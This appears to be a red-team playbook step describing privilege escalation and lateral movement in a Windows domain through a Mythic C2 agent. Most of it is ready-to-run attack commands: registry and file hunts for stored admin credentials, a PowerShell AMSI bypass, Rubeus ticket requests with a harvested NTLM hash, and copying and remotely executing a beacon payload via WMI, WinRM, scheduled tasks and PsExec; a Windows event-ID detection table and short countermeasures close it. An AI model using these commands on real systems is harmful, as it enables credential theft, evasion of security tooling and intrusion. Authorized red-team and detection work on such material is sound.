# Step 3: Pursue Privilege Escalation Methods for Lateral Movement

**Objective**: Forge validated session/ticket and extend access to privileged host (it-workstation subnet). 

---

## Context

- Existing C2 implant for foothold in user-workstation-subnet
- Operator access via Mythic agent Apollo

---

## Execution

### Privilege Escalation

#### 1. Enumerate Local Privilege Escalation Vectors

- Utilize Mythic Agent Apollo (automated script) to attempt the following privilege escalation vectors:
  - Misconfigured Services  
    ```powershell
    task apollo shell 'sc qc <serviceName>'
    ```
  - User Account Control (UAC) Misconfigurations  
    ```powershell
    task apollo shell 'reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System'
    ```
  - PATH Hijacks  
    ```powershell
    task apollo shell 'echo %PATH%'
    ```
  - Misconfigured Scheduled Tasks  
    ```powershell
    task apollo shell 'schtasks /query /fo LIST /v'
    ```
  - Misconfigured Windows Installer Policy (AlwaysInstallElevated)  
    ```powershell
    task apollo shell 'reg query HKCU\Software\Policies\Microsoft\Windows\Installer'
    ```
  - Writable FileSystem Locations  
    ```powershell
    task apollo shell 'icacls C:\ /T | findstr "(F)"'
    ```
  - Impersonate existing elevated token/process privileges  
    ```powershell
    task apollo shell 'whoami /groups'
    ```
  - Existing registry credentials/files/memory  
    ```powershell
    task apollo shell 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'
    ```

#### 2. Locate Stored IT-Admin Credentials in Registry

- Utilizing Mythic Agent Apollo, inspect:
  - AutoLogon credentials  
    ```powershell
    task apollo shell 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'
    ```
  - Remote management tool caches  
    ```powershell
    task apollo shell 'dir /s /b "C:\Users\*\AppData\Roaming\*.xml"'
    ```
  - Common IT-Admin tool keys  
    ```powershell
    task apollo shell 'reg query HKCU\Software\mRemoteNG /s'
    ```
  - Custom IT-Admin scripts/tools  
    ```powershell
    task apollo shell 'dir "C:\Scripts" /s'
    ```

#### 3. Bypass AMSI (Anti-Malware Scan Interface) & Load Rubeus in Memory

- Load AMSI bypass script  
    ```powershell
    task apollo shell '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
    ```
- Load Rubeus via reflective PE injection  
    ```powershell
    task apollo execute-assembly rubeus.exe /command:"help"
    ```

#### 4. Request TGT + PTT (validated ticket)

- Request TGT (if using harvested hash or password)  
    ```powershell
    task apollo execute-assembly rubeus.exe /command:"asktgt /user:it-admin /rc4:<NTLM hash> /domain:corp.local /ptt"
    ```
- Alternatively, pass pre-obtained `.kirbi` file into memory  
    ```powershell
    task apollo execute-assembly rubeus.exe /command:"ptt /ticket:itadmin.kirbi"
    ```

---

### Lateral Movement

#### 1. Remote Access on Target Machines

- Request TGS for remote file access  
    ```powershell
    task apollo execute-assembly rubeus.exe /command:"asktgs /service:cifs/it-wkst01.corp.local /ptt"
    ```
- Access remote share to validate  
    ```powershell
    task apollo shell 'dir \\it-wkst01\C$'
    ```

#### 2. Jump to IT Subnet

- Upload payload via SMB  
    ```powershell
    task apollo shell 'copy beacon.exe \\it-wkst01\C$\Users\Public\'
    ```
- Remotely execute payload  
  - WMI  
    ```powershell
    task apollo shell 'wmic /node:it-wkst01 process call create "C:\Users\Public\beacon.exe"'
    ```
  - WinRM  
    ```powershell
    task apollo shell 'Invoke-Command -ComputerName it-wkst01 -ScriptBlock { Start-Process "C:\Users\Public\beacon.exe" }'
    ```
  - Scheduled Task  
    ```powershell
    task apollo shell 'schtasks /create /s it-wkst01 /tn Update /tr "C:\Users\Public\beacon.exe" /sc once /st 00:00 && schtasks /run /s it-wkst01 /tn Update'
    ```
  - PSExec (if allowed)  
    ```powershell
    task apollo shell 'psexec \\it-wkst01 C:\Users\Public\beacon.exe'
    ```

#### 3. Perform SA

- Who am I?  
    ```powershell
    task apollo shell 'whoami /all'
    ```
- Running processes  
    ```powershell
    task apollo shell 'tasklist'
    ```
- Logged-in users  
    ```powershell
    task apollo shell 'query user'
    ```
- Admins on box  
    ```powershell
    task apollo shell 'net localgroup administrators'
    ```
- Trust relationships  
    ```powershell
    task apollo shell 'nltest /domain_trusts'
    ```

---

## Result

- Access to privileged credentials for lateral movement
- Beacon persistence
- Red Team is deeply rooted IT subnet allowing full access to HR, user, fin, and sec subnets

---

## Detection Opportunities

| **Event ID**    | **Description**                                                    |
| --------------- | ------------------------------------------------------------------ |
| **4624**        | Successful logon (Type 3 = network, Type 10 = RDP)                 |
| **4625**        | Failed logon (brute-force or bad creds)                            |
| **4634**        | Logoff event (used to correlate sessions)                          |
| **4672**        | Special privileges assigned (e.g., SeDebugPrivilege)               |
| **4688**        | Process creation (e.g., `cmd.exe`, `powershell.exe`, `rubeus.exe`) |
| **4697**        | Service installation (e.g., PSExec payloads)                       |
| **4698**        | Scheduled task created                                             |
| **4702**        | Scheduled task updated                                             |
| **4656**        | Handle requested on object (e.g., LSASS memory access attempt)     |
| **4663**        | Object accessed (file/service/registry write attempt)              |
| **4657**        | Registry value modified (e.g., AutoLogon creds)                    |
| **4768**        | Kerberos TGT requested                                             |
| **4769**        | Kerberos TGS requested (e.g., `cifs/host`, `host/target`)          |
| **4770**        | TGT renewal                                                        |
| **4771**        | Kerberos pre-auth failed (ticket manipulation or brute force)      |
| **4776**        | NTLM authentication attempted                                      |
| **5140**        | Network share accessed (e.g., `\\host\C$`)                         |
| **7045**        | New service installed (e.g., PSExec's `PSEXESVC`)                  |
| **4104**        | PowerShell script block logging (encoded commands, AMSI bypasses)  |
| **1 (Sysmon)**  | Process creation (alternative to 4688, richer details)             |
| **10 (Sysmon)** | Process accessed another process (e.g., LSASS memory)              |
| **13 (Sysmon)** | Registry key/value modification                                    |
| **15 (Sysmon)** | File created (e.g., Rubeus dropped to disk)                        |

---

## Defensive Countermeasures

- Restrict lateral tools where not needed (PSExec, WMI, remote PowerShell)
- Enforce least privilege
- Enable credential guard / LSASS protection to prevent memory scraping
- Detect admin shares (C$ access) and lateral movement patterns
- Use honeypot credentials to trigger alerts
